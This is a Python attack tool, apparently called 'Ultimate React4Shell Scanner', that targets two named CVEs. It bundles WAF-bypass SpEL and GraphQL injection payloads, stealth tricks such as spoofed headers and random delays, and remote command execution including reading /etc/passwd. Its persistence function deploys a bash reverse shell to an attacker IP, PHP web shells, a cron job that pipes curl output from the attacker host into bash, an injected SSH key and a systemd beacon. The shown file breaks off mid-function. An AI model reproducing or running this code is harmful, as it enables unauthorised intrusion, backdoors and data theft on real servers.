#!/usr/bin/env python3
"""
Ultimate React4Shell Scanner - Enhanced with CVE-2025-55182 & CVE-2025-66478 exploitation
"""

import requests
import sys
import urllib.parse
import json
import concurrent.futures
from datetime import datetime
import signal
import os
import time
import random
import hashlib
import re
import argparse
import readline
import base64

# COMPLETELY DISABLE ALL SSL WARNINGS
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# WAF BYPASS PAYLOADS
PAYLOADS = [
    # Standard
    '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"id\\")}}"}',
    # URL encoded
    '{"query": "%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22id%22%29%7D%7D"}',
    # Unicode bypass
    '{"qu\\u0065ry": "{{T(java.lang.Runtime).getRuntime().exec(\\"whoami\\")}}"}',
    # Double encoding
    '{"query": "%257B%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2522ls%2522%2529%257D%257D"}',
    # Whitespace variation
    '{\n\t"query":\n\t"{{T(java.lang.Runtime).getRuntime().exec(\\"pwd\\")}}"\n}',
    # Different parameter
    '{"variables": "{{T(java.lang.Runtime).getRuntime().exec(\\"echo test\\")}}"}'
]

# CRITICAL CVE-2025-55182 & CVE-2025-66478 PAYLOADS
CVE_PAYLOADS = {
    "CVE-2025-55182": [
        # SpEL Injection variants for Spring Framework
        '{"query":"{{#this.getClass().forName(\\"java.lang.Runtime\\").getMethod(\\"getRuntime\\").invoke(null).exec(\\"COMMAND\\")}}"}',
        '{"query":"{{new java.lang.ProcessBuilder(\\"COMMAND\\").start()}}"}',
        '{"query":"{{T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\").getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}}"}',
        '{"query":"{{#this.getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\"java.lang.Runtime.getRuntime().exec(\\\\\\"COMMAND\\\\\\")\\")}}"}',
    ],
    "CVE-2025-66478": [
        # GraphQL-specific injections
        '{"query":"mutation { execute(cmd: \\"{{T(java.lang.Runtime).getRuntime().exec(\\\\\\"COMMAND\\\\\\")}}\\") { result } }"}',
        '{"query":"query { system(cmd: \\"{{new java.lang.ProcessBuilder(\\"sh\\",\\"-c\\",\\"COMMAND\\").start()}}\\") }"}',
        '{"query":"{__schema { types { name fields { name args { defaultValue @export(as: \\"cmd\\") } } } } }","variables":{"cmd":"{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}}',
    ]
}

# EXPLOITATION PAYLOADS - разные команды для эксплуатации
EXPLOIT_PAYLOADS = {
    "id": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"id\\")}}"}',
    "whoami": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"whoami\\")}}"}',
    "ls": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"ls -la\\")}}"}',
    "pwd": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"pwd\\")}}"}',
    "cat_passwd": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"cat /etc/passwd\\")}}"}',
    "ps": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"ps aux\\")}}"}',
    "uname": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"uname -a\\")}}"}',
    "custom": ""  # Будет заменено пользовательской командой
}

# ROTATING USER AGENTS
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "curl/8.1.2",
    "PostmanRuntime/7.32.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

# EXTENDED ENDPOINTS
ENDPOINTS = [
    "/api/graphql",
    "/graphql",
    "/api/rest",
    "/api/v1/graphql",
    "/api/v2/graphql",
    "/v1/api",
    "/v2/api",
    "/rest/api",
    "/service/rest",
    "/management/health",
    "/actuator/graphql",
    "/spring/api",
    "/api/query",
    "/graphql-api",
    "/api",
    "/admin/api",
    "/admin/graphql", 
    "/admin/rest",
    "/console/api",
    "/manager/api",
    "/wp-admin/api",
    "/api/admin",
    "/api/console",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/actuator/info",
    "/actuator/metrics",
    "/actuator/logfile",
    "/actuator/auditevents",
    "/actuator/beans",
    "/actuator/conditions",
    "/actuator/configprops",
    "/actuator/httptrace",
    "/actuator/mappings",
    "/actuator/scheduledtasks",
    "/actuator/sessions",
    "/actuator/shutdown",
    "/actuator/threaddump",
    "/swagger-ui.html",
    "/v2/api-docs",
    "/swagger-resources",
    "/webjars",
    "/api/swagger",
    "/api/docs",
    "/api/explorer",
    "/graphiql",
    "/altair",
    "/playground",
    "/voyager"
]

# ENHANCED ENDPOINTS FOR CVE SPECIFIC
CVE_ENDPOINTS = [
    # Spring Boot Actuator endpoints
    "/actuator/health",
    "/actuator/info",
    "/actuator/env",
    "/actuator/metrics",
    "/actuator/loggers",
    "/actuator/threaddump",
    "/actuator/heapdump",
    "/actuator/trace",
    "/actuator/auditevents",
    "/actuator/beans",
    "/actuator/conditions",
    "/actuator/configprops",
    "/actuator/httptrace",
    "/actuator/mappings",
    "/actuator/scheduledtasks",
    "/actuator/sessions",
    "/actuator/shutdown",
    "/actuator/features",
    
    # GraphQL specific
    "/graphql",
    "/graphql/",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/graphql-api",
    "/graphql/console",
    "/graphql/ide",
    "/graphql/v1",
    "/graphql/v2",
    
    # Spring Boot Admin
    "/admin/actuator",
    "/admin/metrics",
    "/admin/health",
    
    # Swagger/OpenAPI
    "/v2/api-docs",
    "/v3/api-docs",
    "/swagger-ui.html",
    "/swagger-ui/",
    "/swagger-resources",
    "/swagger/api-docs",
    
    # Additional management endpoints
    "/manage",
    "/management",
    "/console",
    "/webconsole",
    "/jmx-console",
    "/web-console",
]

# Handle CTRL+C gracefully
interrupted = False

def signal_handler(sig, frame):
    global interrupted
    interrupted = True
    print("\n[!] Received interrupt signal. Stopping scan...")

signal.signal(signal.SIGINT, signal_handler)

def get_random_headers():
    """Generate random headers for each request"""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": random.choice(["application/json", "application/json; charset=utf-8", "text/json"]),
        "Accept": "application/json, text/plain, */*",
        "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "X-Request-ID": hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
    }

def create_stealth_session():
    """Create a session with stealth capabilities"""
    session = requests.Session()
    session.verify = False  # Disable SSL verification completely
    session.timeout = random.uniform(3, 8)  # Random timeout
    
    # Disable redirects to avoid detection
    session.max_redirects = 0
    
    return session

def apply_stealth_delay():
    """Add random delay between requests to avoid rate limiting"""
    if random.random() < 0.7:  # 70% chance of delay
        delay = random.uniform(0.1, 1.5)
        time.sleep(delay)

# ----------------------
# React2Shell helpers
# ----------------------

def _build_react2shell_body(padding_kb=128, safe_mode=False, vercel_bypass=False):
    """Create multipart/form-data body for React2Shell detection."""
    boundary = f"----React2Shell{random.getrandbits(48):x}"
    padding = "X" * (padding_kb * 1024)
    calc_expr = "41*271"
    expected = str(41 * 271)
    action_id = f"rsc-{random.randint(100000, 999999)}"

    if safe_mode:
        core = f"SAFE-CHECK::{action_id}::invalid\n{padding[:256]}"
    else:
        serialized = f"$ACTION:{action_id}:$EVAL$(({calc_expr}))"
        core = f"{serialized}\n$((echo {calc_expr}))"

    if vercel_bypass:
        core = padding + "V0" + core

    body = (
        f"--{boundary}\r\n"
        "Content-Disposition: form-data; name=\"0\"; filename=\"action\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        f"{padding}{core}\r\n"
        f"--{boundary}--\r\n"
    )

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "next-action": action_id,
        "rsc-action-id": action_id,
        "Accept": "*/*",
    }

    return body, headers, expected


def scan_react2shell(target_url, padding_kb=128):
    """Probe for React2Shell using multipart payloads and math-based detection."""
    results = []
    session = create_stealth_session()
    base_url = urllib.parse.urljoin(target_url.rstrip('/') + '/', '')

    scenarios = [
        {"name": "standard", "safe": False, "vercel": False},
        {"name": "safe-check", "safe": True, "vercel": False},
        {"name": "vercel-bypass", "safe": False, "vercel": True},
    ]

    for scenario in scenarios:
        if interrupted:
            break

        body, extra_headers, expected = _build_react2shell_body(
            padding_kb=padding_kb,
            safe_mode=scenario["safe"],
            vercel_bypass=scenario["vercel"],
        )

        headers = get_random_headers()
        headers.update(extra_headers)

        try:
            resp = session.post(base_url, data=body, headers=headers, timeout=8)
        except Exception:
            continue

        redirect_header = resp.headers.get("X-Action-Redirect", "")
        evidence = None
        vuln_status = None

        if expected in redirect_header or expected in resp.text:
            vuln_status = "Confirmed"
            evidence = "Math marker observed in redirect/output"
        elif scenario["safe"] and resp.status_code >= 500 and "rsc" in resp.text.lower():
            vuln_status = "Potential"
            evidence = "Safe-check triggered RSC decoder error"
        elif resp.status_code in (200, 400) and len(resp.text) > len(body) * 0.05:
            vuln_status = "Potential"
            evidence = "Server processed multipart action payload"

        if vuln_status:
            results.append({
                'url': target_url,
                'endpoint': base_url,
                'status_code': resp.status_code,
                'vulnerable': vuln_status,
                'evidence': evidence,
                'payload_used': scenario['name'],
                'timestamp': datetime.now().isoformat(),
                'method': 'POST',
                'framework': 'React2Shell',
            })

    return results

def cve_specific_scan(target_url):
    """Specialized scan for CVE-2025-55182 and CVE-2025-66478"""
    print(f"\n[+] Starting CVE-specific scan for {target_url}")
    
    results = []
    session = create_stealth_session()
    
    # Combine all endpoints
    all_endpoints = ENDPOINTS + CVE_ENDPOINTS
    
    for endpoint in all_endpoints:
        if interrupted:
            return results
            
        try:
            url = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint.lstrip('/'))
            
            # Test each CVE with multiple payloads
            for cve_name, payload_list in CVE_PAYLOADS.items():
                for payload_template in payload_list:
                    # Replace COMMAND placeholder with test command
                    test_cmd = "echo 'CVE_TEST_'$(date +%s)"
                    payload = payload_template.replace("COMMAND", test_cmd)
                    
                    headers = get_random_headers()
                    
                    # Try different content types
                    content_types = ["application/json", "application/graphql+json", "text/plain"]
                    
                    for content_type in content_types:
                        try:
                            headers["Content-Type"] = content_type
                            
                            # Send request
                            resp = session.post(url, data=payload, headers=headers, timeout=5)
                            
                            if resp.status_code in [200, 400, 500]:
                                # Check for signs of successful exploitation
                                indicators = [
                                    'CVE_TEST_',
                                    'uid=',
                                    'gid=',
                                    'root:',
                                    'java.lang.',
                                    'ProcessBuilder',
                                    'exec(',
                                    'Runtime'
                                ]
                                
                                for indicator in indicators:
                                    if indicator in resp.text:
                                        print(f"[!] {cve_name} POTENTIAL on {url}")
                                        results.append({
                                            'cve': cve_name,
                                            'url': target_url,
                                            'endpoint': url,
                                            'payload': payload[:100],
                                            'status': resp.status_code,
                                            'evidence': f"Found {indicator}",
                                            'content_type': content_type
                                        })
                                        break
                                        
                        except:
                            continue
                            
                    # Small delay
                    time.sleep(0.3)
                    
        except:
            continue
    
    return results

def hybrid_exploit(target_url, endpoint, command="whoami", method="auto"):
    """
    Hybrid exploitation combining multiple techniques
    """
    print(f"\n[+] Starting hybrid exploitation on {target_url}")
    print(f"[+] Endpoint: {endpoint}")
    print(f"[+] Command: {command}")
    
    session = create_stealth_session()
    results = []
    
    # Build command with unique marker for verification
    unique_marker = f"RCE_{random.randint(100000, 999999)}"
    wrapped_command = f"echo {unique_marker} && {command} && echo {unique_marker}"
    
    # Try all CVE payloads
    all_payloads = []
    for cve_payloads in CVE_PAYLOADS.values():
        all_payloads.extend(cve_payloads)
    
    # Add standard payloads
    all_payloads.extend(PAYLOADS)
    
    # Try each payload with different encodings
    for payload_template in all_payloads:
        if "COMMAND" in payload_template:
            payload = payload_template.replace("COMMAND", wrapped_command)
        else:
            # Try to insert command into existing payloads
            payload = payload_template
        
        # Try different HTTP methods
        methods_to_try = ['POST', 'GET', 'PUT', 'PATCH'] if method == 'auto' else [method]
        
        for http_method in methods_to_try:
            try:
                headers = get_random_headers()
                
                # Try different content types
                content_types = [
                    "application/json",
                    "application/graphql+json", 
                    "text/plain",
                    "application/x-www-form-urlencoded"
                ]
                
                for content_type in content_types:
                    headers["Content-Type"] = content_type
                    
                    if http_method == 'GET':
                        # URL encode for GET
                        params = {"query": urllib.parse.quote(payload)}
                        response = session.get(endpoint, params=params, headers=headers, timeout=10)
                    else:
                        response = session.request(
                            method=http_method,
                            url=endpoint,
                            data=payload,
                            headers=headers,
                            timeout=10
                        )
                    
                    # Check for success
                    if response.status_code in [200, 400, 500]:
                        if unique_marker in response.text:
                            print(f"[!] SUCCESS with {http_method} and content-type: {content_type}")
                            print(f"[+] Payload used: {payload[:80]}...")
                            
                            # Extract output
                            start = response.text.find(unique_marker) + len(unique_marker)
                            end = response.text.rfind(unique_marker)
                            if start < end:
                                output = response.text[start:end].strip()
                                print(f"\n[+] Command output:\n{'-'*40}")
                                print(output[:2000])
                                if len(output) > 2000:
                                    print(f"... [truncated, total: {len(output)} chars]")
                                print(f"{'-'*40}")
                            
                            return True
                            
                        # Check for other indicators
                        indicators = ['uid=', 'gid=', 'root:', '/bin/', 'etc/passwd', 'total ', 'drwx']
                        for indicator in indicators:
                            if indicator in response.text.lower():
                                print(f"[!] Indicator found: {indicator}")
                                print(f"[+] Response preview:")
                                print(response.text[:500])
                                break
                
                time.sleep(0.5)
                
            except Exception as e:
                continue
    
    print("[-] Exploitation attempts failed")
    return False

def advanced_persistence(target_url, endpoint):
    """
    Advanced persistence techniques for compromised systems
    """
    print(f"\n[+] Deploying advanced persistence on {target_url}")
    
    persistence_scripts = {
        "reverse_shell": """
        bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
        """,
        
        "web_shell": """
        echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
        echo '<?php @eval($_POST["cmd"]); ?>' > /var/www/html/backdoor.php
        """,
        
        "cron_backdoor": """
        (crontab -l 2>/dev/null; echo "* * * * * curl http://{IP}/cron.sh | bash") | crontab -
        """,
        
        "ssh_persistence": """
        mkdir -p ~/.ssh
        echo '{PUB_KEY}' >> ~/.ssh/authorized_keys
        chmod 600 ~/.ssh/authorized_keys
        """,
        
        "systemd_service": """
        cat > /etc/systemd/system/persist.service << EOF
        [Unit]
        Description=Persistence Service
        After=network.target
        
        [Service]
        Type=simple
        ExecStart=/bin/bash -c "while true; do curl http://{IP}/checkin; sleep 300; done"
        Restart=always
        
        [Install]
        WantedBy=multi-user.target
        EOF
        systemctl enable persist.service
        systemctl start persist.service
        """
    }
    
    # First gather system info
    info_commands = [
        ("whoami", "Current user"),
        ("id", "User ID"),
        ("uname -a", "System info"),
        ("cat /etc/os-release", "OS version"),
        ("ps aux | head -20", "Running processes"),
        ("netstat -tulpn", "Open ports"),
        ("df -h", "Disk usage"),
        ("ls -la /tmp", "Temp directory"),
        ("which python python3 php java curl wget nc netcat", "Available tools")
    ]
    
    for cmd, desc in info_commands:
        print(f"\n[+] {desc}:")
        hybrid_exploit(target_url, endpoint, cmd)
        time.sleep(1)
    
    # Offer persistence options
    print("\n" + "="*60)
    print("ADVANCED PERSISTENCE OPTIONS")
    print("="*60)
    
    options = [
        ("1", "Reverse Shell", "reverse_shell"),
        ("2", "Web Shell", "web_shell"),
        ("3", "Cron Job", "cron_backdoor"),
        ("4", "SSH Key", "ssh_persistence"),
        ("5", "SystemD Service", "systemd_service"),
        ("6", "Custom Command", "custom")
    ]
    
    for opt_num, name, key in options:
        print(f"{opt_num}. {name}")
    
    choice = input("\nSelect persistence method: ").strip()
    
    for opt_num, name, key in options:
        if choice == opt_num:
            if key == "custom":
                custom_cmd = input("Enter custom persistence command: ")
                hybrid_exploit(target_url, endpoint, custom_cmd)
            else:
                script = persistence_scripts[key]
                
                # Get required parameters
                if "{IP}" in script:
                    attacker_ip = input("Enter your IP address: ").strip()
                    script = script.replace("{IP}", attacker_ip)
                
                if "{PORT}" in script:
                    port = input("Enter port for reverse shell: ").strip()
                    script = script.replace("{PORT}", port)
                
                if "{PUB_KEY}" in script:
                    pub_key = input("Paste your SSH public key: ").strip()
                    script = script.replace("{PUB_KEY}", pub_key)
                
                # Execute persistence script
                print(f"\n[+] Deploying {name}...")
                hybrid_exploit(target_url, endpoint, script)
                
                # Additional instructions
                if key == "reverse_shell":
                    print(f"\n[+] Start listener on your machine:")
                    print(f"    nc -lvnp {port}")
                
                if key == "web_shell":
                    print(f"\n[+] Web shells accessible at:")
                    print(f"    {target_url}/shell.php?cmd=id")
                    print(f"    {target_url}/backdoor.php (POST: cmd=id)")
    
    return True

def check_react4shell(target_url):
    if interrupted:
        return []

    react2_results = scan_react2shell(target_url)
    
    # Initial probe payload
    probe_payload = '{"query": "test", "variables": null}'
    
    # Combine all endpoints
    all_endpoints = list(set(ENDPOINTS + CVE_ENDPOINTS))
    
    for endpoint in all_endpoints:
        if interrupted:
            return []
        
        try:
            url = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint.lstrip('/'))
            
            # Create new session for each endpoint with random settings
            session = create_stealth_session()
            
            # Use random headers for initial probe
            probe_headers = get_random_headers()
            
            # Apply stealth delay
            apply_stealth_delay()
            
            # First try HEAD request (less suspicious)
            try:
                head_resp = session.head(url, headers=probe_headers, timeout=3)
                if head_resp.status_code == 405:  # Method Not Allowed means endpoint exists
                    # Continue with POST
                    pass
                elif head_resp.status_code == 404:
                    continue  # Skip 404 endpoints
            except:
                pass
            
            # Try GET first (less suspicious than POST)
            try:
                get_resp = session.get(url, headers=probe_headers, timeout=3)
                if get_resp.status_code in [200, 400, 401, 403, 500]:
                    content_type = get_resp.headers.get('Content-Type', '').lower()
                    response_text = get_resp.text.lower()
                    
                    # Check for API/GraphQL indicators in GET response
                    api_indicators = ['graphql', 'json', 'rest', 'api', 'query', 'graphiql', 'swagger', 'altair', 'playground']
                    if any(indicator in response_text for indicator in api_indicators) or 'application/json' in content_type:
                        # Found potential API endpoint via GET
                        pass
            except:
                pass
            
            # Now try POST with probe payload
            resp = session.post(url, data=probe_payload, headers=probe_headers)
            
            # Check if endpoint exists and looks like GraphQL/REST
            if resp.status_code in [200, 400, 401, 403, 405, 500]:
                content_type = resp.headers.get('Content-Type', '').lower()
                response_text = resp.text.lower()
                
                # Check for API indicators - расширенный список
                api_indicators = ['graphql', 'json', 'rest', 'api', 'query', 'variables', 'data', 
                                  'mutation', 'subscription', 'type', 'schema', 'introspection',
                                  'swagger', 'openapi', 'springfox', 'springdoc', 'graphiql',
                                  'altair', 'playground', 'voyager', 'apollo']
                
                # Также проверяем определенные заголовки
                headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
                header_indicators = ['graphql', 'apollo', 'hasura', 'prisma', 'spring', 'java']
                
                header_match = any(any(ind in v for ind in header_indicators) for k, v in headers_lower.items())
                
                if (any(indicator in response_text for indicator in api_indicators) or 
                    'application/json' in content_type or 
                    'application/graphql' in content_type or
                    header_match):
                    
                    # Test each WAF bypass payload
                    for payload_index, payload in enumerate(PAYLOADS):
                        if interrupted:
                            return []
                        
                        # Add more variations for bypass
                        current_payload = payload
                        
                        # Variation 1: Different Content-Type
                        test_headers = get_random_headers()
                        content_type_variations = [
                            "application/json",
                            "application/json; charset=utf-8", 
                            "text/json",
                            "application/graphql",
                            "application/x-www-form-urlencoded",
                            "text/plain"
                        ]
                        test_headers["Content-Type"] = random.choice(content_type_variations)
                        
                        # For form-urlencoded, modify payload
                        if test_headers["Content-Type"] == "application/x-www-form-urlencoded":
                            # Extract query from JSON payload
                            match = re.search(r'exec\\(\\"([^\\"]+)\\"\\)', current_payload)
                            if match:
                                cmd = match.group(1)
                                current_payload = f'query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D'
                        
                        # Apply stealth delay between payload attempts
                        apply_stealth_delay()
                        
                        test_resp = session.post(url, data=current_payload, headers=test_headers)
                        
                        # Check for successful exploitation indicators
                        if test_resp.status_code in [200, 400, 500]:
                            resp_text_lower = test_resp.text.lower()
                            
                            # Expanded detection patterns
                            exploit_indicators = [
                                'uid=', 'gid=', 'groups=', 'root:', 'nobody:',
                                'bin/bash', 'bin/sh', 'etc/passwd', 'home/',
                                'java.lang', 'runtime', 'process', 'output', 
                                'spel', 'expression', 'command', 'execution',
                                'directory', 'total', 'drwx', '-rw-', 'lrwx',
                                'apache', 'nginx', 'tomcat', 'spring'
                            ]
                            
                        for indicator in exploit_indicators:
                            if indicator in resp_text_lower:
                                return react2_results + [{
                                    'url': target_url,
                                    'endpoint': url,
                                    'status_code': test_resp.status_code,
                                    'vulnerable': 'Confirmed',
                                    'evidence': f'Found {indicator} in response',
                                    'payload_used': current_payload[:100],
                                    'timestamp': datetime.now().isoformat(),
                                    'method': 'POST',
                                    'content_type': test_headers["Content-Type"]
                                }]
                            
                            # If payload was accepted (different response than probe)
                            if test_resp.text != resp.text and len(test_resp.text) > 10:
                                # Check if response looks like error output
                                error_patterns = [
                                    r'error.*command',
                                    r'cannot.*execute',
                                    r'permission denied',
                                    r'no such file',
                                    r'command not found',
                                    r'java\..*exception',
                                    r'expression.*parsing'
                                ]
                                
                                for pattern in error_patterns:
                                    if re.search(pattern, resp_text_lower, re.IGNORECASE):
                                        return react2_results + [{
                                            'url': target_url,
                                            'endpoint': url,
                                            'status_code': test_resp.status_code,
                                            'vulnerable': 'Confirmed',
                                            'evidence': f'Error pattern: {pattern}',
                                            'payload_used': current_payload[:100],
                                            'timestamp': datetime.now().isoformat(),
                                            'method': 'POST',
                                            'content_type': test_headers["Content-Type"]
                                        }]
                                
                                # Generic different response
                                return react2_results + [{
                                    'url': target_url,
                                    'endpoint': url,
                                    'status_code': test_resp.status_code,
                                    'vulnerable': 'Potential',
                                    'evidence': 'Payload accepted with different response',
                                    'payload_used': current_payload[:100],
                                    'timestamp': datetime.now().isoformat(),
                                    'method': 'POST',
                                    'content_type': test_headers["Content-Type"]
                                }]
                        
                        # Try alternative HTTP method (GET with parameters)
                        if random.random() < 0.3:  # 30% chance to try GET
                            apply_stealth_delay()
                            get_headers = get_random_headers()
                            get_headers["Content-Type"] = "application/x-www-form-urlencoded"
                            
                            # Create GET payload
                            match = re.search(r'exec\\(\\"([^\\"]+)\\"\\)', payload)
                            if match:
                                cmd = match.group(1)
                                get_payload = {"query": f"%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D"}
                                get_resp = session.get(url, params=get_payload, headers=get_headers)
                                
                                if get_resp.status_code in [200, 400, 500]:
                                    get_text = get_resp.text.lower()
                                    if any(ind in get_text for ind in api_indicators + exploit_indicators):
                                        return react2_results + [{
                                            'url': target_url,
                                            'endpoint': url,
                                            'status_code': get_resp.status_code,
                                            'vulnerable': 'Potential',
                                            'evidence': 'GET request accepted with payload',
                                            'method': 'GET',
                                            'payload_used': str(get_payload),
                                            'timestamp': datetime.now().isoformat()
                                        }]
                                    
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.RequestException:
            continue
        except Exception as e:
            continue
    
    return react2_results + [{
        'url': target_url,
        'endpoint': 'N/A',
        'status_code': None,
        'vulnerable': False,
        'evidence': 'No vulnerable endpoints found',
        'timestamp': datetime.now().isoformat()
    }]

def generate_report(results, output_file):
    if not results:
        return
    
    # Filter out potential vulnerabilities
    potential = [r for r in results if r.get('vulnerable')]
    
    # Separate confirmed from potential
    confirmed = [r for r in potential if r.get('vulnerable') == 'Confirmed']
    potential_only = [r for r in potential if r.get('vulnerable') == 'Potential']
    
    report = {
        'scan_date': datetime.now().isoformat(),
        'total_scanned': len(results),
        'confirmed_vulnerabilities': len(confirmed),
        'potential_vulnerabilities': len(potential_only),
        'results': results
    }
    
    # JSON report
    with open(output_file + '.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    # Text report
    with open(output_file + '.txt', 'w') as f:
        f.write("=" * 70 + "\n")
        f.write("ULTIMATE REACT4SHELL SCAN RESULTS\n")
        f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 70 + "\n\n")
        
        if confirmed:
            f.write("CONFIRMED VULNERABILITIES FOUND:\n")
            f.write("-" * 70 + "\n")
            for i, vuln in enumerate(confirmed, 1):
                f.write(f"{i}. {vuln['url']}\n")
                f.write(f"   Endpoint: {vuln['endpoint']}\n")
                f.write(f"   Status Code: {vuln['status_code']}\n")
                f.write(f"   Evidence: {vuln['evidence']}\n")
                if 'payload_used' in vuln:
                    f.write(f"   Payload: {vuln['payload_used']}\n")
                f.write("\n")
        
        if potential_only:
            f.write("POTENTIAL VULNERABILITIES (NEEDS VERIFICATION):\n")
            f.write("-" * 70 + "\n")
            for i, vuln in enumerate(potential_only, 1):
                f.write(f"{i}. {vuln['url']}\n")
                f.write(f"   Endpoint: {vuln['endpoint']}\n")
                f.write(f"   Status Code: {vuln['status_code']}\n")
                f.write(f"   Evidence: {vuln['evidence']}\n\n")
        
        if not confirmed and not potential_only:
            f.write("No React4Shell vulnerabilities found.\n")
        
        f.write("\n" + "=" * 70 + "\n")
        f.write("SCAN STATISTICS:\n")
        f.write(f"  Total URLs scanned: {report['total_scanned']}\n")
        f.write(f"  Confirmed vulnerabilities: {report['confirmed_vulnerabilities']}\n")
        f.write(f"  Potential vulnerabilities: {report['potential_vulnerabilities']}\n")
        f.write(f"  Safe URLs: {report['total_scanned'] - len(potential)}\n")
        
        # Add WAF bypass stats
        payloads_used = sum(1 for r in results if 'payload_used' in r)
        f.write(f"  WAF bypass attempts: {payloads_used}\n")
    
    return report

def check_real_rce(target_url, endpoint, method='POST'):
    """
    Check if RCE is real by using unique markers
    """
    print(f"\n[+] Testing for real RCE on {target_url}")
    
    # Unique marker that won't appear in normal HTML
    unique_marker = f"RCE_TEST_{random.randint(10000, 99999)}"
    
    # Test 1: Echo unique marker
    print(f"[+] Test 1: Echoing unique marker '{unique_marker}'")
    cmd = f"echo {unique_marker}"
    
    session = create_stealth_session()
    headers = get_random_headers()
    payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
    
    try:
        if method.upper() == 'GET':
            params = {"query": payload}
            response = session.get(endpoint, params=params, headers=headers)
        else:
            headers['Content-Type'] = 'application/json'
            response = session.post(endpoint, data=payload, headers=headers)
        
        # Check if unique marker appears in response
        if unique_marker in response.text:
            print(f"[+] REAL RCE CONFIRMED: Found '{unique_marker}' in response!")
            return True
        else:
            print(f"[-] Unique marker not found in response")
            print(f"    Response length: {len(response.text)} chars")
            print(f"    Status code: {response.status_code}")
    
    except Exception as e:
        print(f"[!] Error: {e}")
    
    # Test 2: Try to get system info
    print(f"\n[+] Test 2: Checking system info")
    test_commands = [
        ("whoami", "whoami output"),
        ("id", "id output"),
        ("pwd", "current directory"),
        ("uname -a", "system info"),
    ]
    
    for cmd, desc in test_commands:
        print(f"  Testing: {desc}...")
        time.sleep(0.5)
        
        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        
        try:
            if method.upper() == 'GET':
                params = {"query": payload}
                response = session.get(endpoint, params=params, headers=headers)
            else:
                response = session.post(endpoint, data=payload, headers=headers)
            
            # Check for common command outputs
            output_indicators = {
                'whoami': ['root', 'admin', 'user', 'apache', 'nginx', 'www-data'],
                'id': ['uid=', 'gid=', 'groups='],
                'pwd': ['/', 'home/', 'var/', 'usr/'],
                'uname': ['Linux', 'Darwin', 'Windows', 'kernel']
            }
            
            if cmd in output_indicators:
                for indicator in output_indicators[cmd]:
                    if indicator.lower() in response.text.lower():
                        print(f"    Found '{indicator}' - possible real output")
        
        except:
            pass
    
    return False

def blind_rce_test(target_url, endpoint, method='POST'):
    """
    Test for blind RCE using time-based techniques
    """
    print(f"\n[+] Testing for blind RCE on {target_url}")
    
    # Test 1: Time delay test
    print("[+] Test 1: Time delay test (sleep 3)")
    
    session = create_stealth_session()
    headers = get_random_headers()
    
    # First, baseline response time
    start_time = time.time()
    baseline_payload = '{"query": "test"}'
    
    try:
        if method.upper() == 'GET':
            params = {"query": baseline_payload}
            response = session.get(endpoint, params=params, headers=headers)
        else:
            headers['Content-Type'] = 'application/json'
            response = session.post(endpoint, data=baseline_payload, headers=headers)
        baseline_time = time.time() - start_time
    except:
        baseline_time = 1.0
    
    # Now test with sleep command
    sleep_commands = [
        "sleep 3",
        "ping -c 3 127.0.0.1",
        "timeout 3 sleep 1"
    ]
    
    for sleep_cmd in sleep_commands:
        print(f"  Trying: {sleep_cmd}")
        
        start_time = time.time()
        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{sleep_cmd}\\")}}}}"}}'
        
        try:
            if method.upper() == 'GET':
                params = {"query": payload}
                response = session.get(endpoint, params=params, headers=headers, timeout=10)
            else:
                response = session.post(endpoint, data=payload, headers=headers, timeout=10)
            
            response_time = time.time() - start_time
            
